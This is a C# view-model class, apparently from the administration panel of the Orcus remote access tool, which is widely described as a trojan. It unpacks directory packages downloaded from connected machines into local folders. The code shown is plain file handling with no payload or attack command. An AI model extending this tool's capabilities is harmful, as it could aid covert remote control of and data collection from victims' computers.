using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Orcus.Administration.Plugins.DataManager;
using Orcus.Plugins;
using Orcus.Shared.Commands.DataManager;
using Orcus.Shared.Utilities;
using Orcus.Shared.Utilities.Compression;

namespace Orcus.Administration.ViewModels.DataManager.DataTypes
{
    public class FileManagerDirectoryOld : IDataManagerType
    {
        public bool CanDownload { get; } = true;

        public string GetFileExtension(DataEntry dataEntry)
        {
            return "";
        }

        public void ModifyDownloadedFile(string fileName)
        {
            var tempPath = Path.Combine(Path.GetDirectoryName(fileName), Guid.NewGuid().ToString("N"));
            File.Move(fileName, tempPath);
            var directory = new DirectoryInfo(FileExtensions.MakeDirectoryUnique(fileName));
            directory.Create();
            Packages.ExtractFilesFromPackage(tempPath, directory.FullName);
            File.Delete(tempPath);
        }

        public string TypeId { get; } = (string) Application.Current.Resources["Directory"];
        public bool SupportsMultipleEntries { get; } = false;
        public bool IsDataViewable { get; } = false;
        public Guid DataTypeGuid { get; } = DataMode.Package.Guid;

        public ImageSource GetIconForEntry(DataEntry dataEntry)
        {
            return new BitmapImage(new Uri("/Resources/Images/Folder.png", UriKind.Relative));
        }

        public void ChangeEntryData(DataEntry dataEntry)
        {
        }

        public Task<DataViewer> GetDataViewer(DataEntry dataEntry, IDataConnection dataConnection)
        {
            throw new NotImplementedException();
        }

        public Task<DataViewer> GetDataViewer(List<DataEntry> dataEntries, IDataConnection dataConnection)
        {
            throw new NotImplementedException();
        }
    }
}